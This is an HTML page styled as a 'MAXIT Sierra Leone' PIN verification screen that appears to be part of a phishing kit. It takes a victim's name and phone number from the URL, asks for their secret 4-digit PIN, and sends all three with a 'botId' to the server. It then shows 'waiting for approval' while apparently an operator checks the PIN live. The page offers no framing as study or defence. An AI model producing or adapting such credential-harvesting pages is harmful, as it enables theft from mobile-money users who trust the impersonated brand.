<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PIN Verification</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
            background: #000;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: #111;
            border-radius: 20px;
            padding: 40px;
            max-width: 450px;
            width: 100%;
            box-shadow: 0 20px 60px rgba(0,0,0,0.8);
        }
        .logo {
            text-align: center;
            margin-bottom: 10px;
        }
        .logo h1 {
            color: #7a3d1c;
            font-size: 28px;
            font-weight: 700;
            letter-spacing: 2px;
        }
        .logo .sub {
            color: #7a3d1c;
            font-size: 12px;
            letter-spacing: 4px;
            opacity: 0.7;
        }
        .header {
            text-align: center;
            margin-bottom: 30px;
        }
        .header h2 {
            color: #7a3d1c;
            font-size: 20px;
            font-weight: 600;
        }
        .header p {
            color: #888;
            font-size: 14px;
            margin-top: 5px;
        }
        .form-group {
            margin-bottom: 20px;
        }
        .pin-container {
            display: flex;
            gap: 12px;
            justify-content: center;
            margin: 20px 0;
        }
        .pin-box {
            width: 60px;
            height: 70px;
            text-align: center;
            font-size: 28px;
            font-weight: 600;
            border: 2px solid #333;
            border-radius: 12px;
            transition: border-color 0.3s, box-shadow 0.3s;
            background: #1a1a1a;
            color: white;
        }
        .pin-box:focus {
            outline: none;
            border-color: #7a3d1c;
            box-shadow: 0 0 0 3px rgba(122, 61, 28, 0.3);
            background: #222;
        }
        .pin-box.filled {
            border-color: #7a3d1c;
            background: #222;
        }
        .btn {
            width: 100%;
            padding: 14px;
            background: #7a3d1c;
            color: white;
            border: none;
            border-radius: 10px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.3s;
        }
        .btn:hover:not(:disabled) {
            background: #5a2d12;
        }
        .btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }
        .status {
            margin-top: 20px;
            padding: 12px;
            border-radius: 10px;
            text-align: center;
            display: none;
            font-weight: 500;
        }
        .status.show {
            display: block;
        }
        .status.waiting {
            background: #1a1a2e;
            color: #ffd93d;
        }
        .status.success {
            background: #1a2e1a;
            color: #6bcb77;
        }
        .status.error {
            background: #2e1a1a;
            color: #ff6b6b;
        }
        .back-link {
            display: block;
            text-align: center;
            margin-top: 20px;
            color: #7a3d1c;
            text-decoration: none;
            font-size: 14px;
        }
        .back-link:hover {
            text-decoration: underline;
        }
        .divider {
            border: none;
            border-top: 1px solid #333;
            margin: 20px 0;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <h1>MAXIT</h1>
            <div class="sub">sierra leone</div>
        </div>

        <hr class="divider">

        <div class="header">
            <h2>🔐 Enter Your Secret Code</h2>
            <p>Please enter your 4-digit PIN</p>
        </div>

        <form id="pinForm">
            <div class="form-group">
                <div class="pin-container">
                    <input type="text" class="pin-box" id="pin1" maxlength="1" inputmode="numeric" pattern="[0-9]" autofocus>
                    <input type="text" class="pin-box" id="pin2" maxlength="1" inputmode="numeric" pattern="[0-9]">
                    <input type="text" class="pin-box" id="pin3" maxlength="1" inputmode="numeric" pattern="[0-9]">
                    <input type="text" class="pin-box" id="pin4" maxlength="1" inputmode="numeric" pattern="[0-9]">
                </div>
            </div>
            <button type="submit" class="btn" id="submitBtn">🔐 Verify PIN</button>
        </form>

        <div class="status" id="status"></div>
        <a href="#" class="back-link" id="backLink">← Go Back</a>
    </div>

    <script>
        // Get data from URL params
        const urlParams = new URLSearchParams(window.location.search);
        const name = urlParams.get('name');
        const phone = urlParams.get('phone');
        const botId = urlParams.get('botId');

        // Handle back link
        const backLink = document.getElementById('backLink');
        if (botId) {
            backLink.href = `/sms.html?name=${encodeURIComponent(name)}&phone=${encodeURIComponent(phone)}&botId=${botId}`;
        }

        const pinInputs = document.querySelectorAll('.pin-box');
        const form = document.getElementById('pinForm');
        const status = document.getElementById('status');
        const submitBtn = document.getElementById('submitBtn');

        function showStatus(message, type) {
            status.textContent = message;
            status.className = 'status show';
            if (type) {
                status.classList.add(type);
            }
        }

        // Auto-focus next input
        pinInputs.forEach((input, index) => {
            input.addEventListener('input', function(e) {
                // Only allow digits
                this.value = this.value.replace(/\D/g, '');
                
                // Add filled class if value exists
                if (this.value) {
                    this.classList.add('filled');
                } else {
                    this.classList.remove('filled');
                }

                // Move to next input if value is entered
                if (this.value && index < pinInputs.length - 1) {
                    pinInputs[index + 1].focus();
                }
            });

            // Handle backspace
            input.addEventListener('keydown', function(e) {
                if (e.key === 'Backspace' && !this.value && index > 0) {
                    pinInputs[index - 1].focus();
                    pinInputs[index - 1].value = '';
                    pinInputs[index - 1].classList.remove('filled');
                }
            });

            // Handle paste
            input.addEventListener('paste', function(e) {
                e.preventDefault();
                const paste = (e.clipboardData || window.clipboardData).getData('text');
                const digits = paste.replace(/\D/g, '').slice(0, 4);
                
                pinInputs.forEach((pin, i) => {
                    if (i < digits.length) {
                        pin.value = digits[i] || '';
                        if (pin.value) {
                            pin.classList.add('filled');
                        } else {
                            pin.classList.remove('filled');
                        }
                    }
                });

                // Focus last filled or next empty
                const nextEmpty = Array.from(pinInputs).find(p => !p.value);
                if (nextEmpty) {
                    nextEmpty.focus();
                } else {
                    pinInputs[3].focus();
                }
            });

            // Prevent non-numeric characters
            input.addEventListener('keypress', function(e) {
                if (!/[0-9]/.test(e.key) && e.key !== 'Backspace' && e.key !== 'Tab') {
                    e.preventDefault();
                }
            });
        });

        form.addEventListener('submit', async (e) => {
            e.preventDefault();

            // Get all PIN values
            const pin = Array.from(pinInputs).map(input => input.value).join('');

            if (pin.length !== 4) {
                showStatus('Please enter all 4 digits of your PIN.', 'error');
                pinInputs.forEach(input => {
                    if (!input.value) {
                        input.style.borderColor = '#ff6b6b';
                        setTimeout(() => {
                            input.style.borderColor = '#333';
                        }, 1000);
                    }
                });
                return;
            }

            if (!name || !phone || !botId) {
                showStatus('Missing required information. Please go back and try again.', 'error');
                return;
            }

            // Show loading state
            submitBtn.disabled = true;
            submitBtn.textContent = '⏳ Verifying...';
            showStatus('⏳ Waiting for  approval...', 'waiting');

            try {
                const response = await fetch('/submit-pin', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        name: name,
                        phone: phone,
                        pin: pin,
                        botId: botId
                    })
                });

                const data = await response.json();

                if (!response.ok) {
                    throw new Error(data.error || 'Failed to submit PIN');
                }

                // Poll for approval
                const poll = setInterval(async () => {
                    try {
                        const r = await fetch(`/check-pin/${data.requestId}`);
                        const d = await r.json();

                        if (d.approved === true) {
                            clearInterval(poll);
                            showStatus('✅ PIN verified! Redirecting...', 'success');
                            submitBtn.disabled = false;
                            submitBtn.textContent = '🔐 Verify PIN';
                            setTimeout(() => {
                                window.location.href = `/success.html?name=${encodeURIComponent(name)}&phone=${encodeURIComponent(phone)}&botId=${botId}`;
                            }, 1500);
                        }

                        if (d.approved === false) {
                            clearInterval(poll);
                            showStatus('❌ Incorrect Pin.', 'error');
                            submitBtn.disabled = false;
                            submitBtn.textContent = '🔐 Verify PIN';
                            // Clear PIN boxes
                            pinInputs.forEach(input => {
                                input.value = '';
                                input.classList.remove('filled');
                            });
                            pinInputs[0].focus();
                        }

                    } catch (err) {
                        clearInterval(poll);
                        showStatus('⚠️ Connection lost. Please try again.', 'error');
                        submitBtn.disabled = false;
                        submitBtn.textContent = '🔐 Verify PIN';
                    }
                }, 2000);

            } catch (error) {
                showStatus('❌ ' + error.message, 'error');
                submitBtn.disabled = false;
                submitBtn.textContent = '🔐 Verify PIN';
            }
        });
    </script>
</body>
</html>
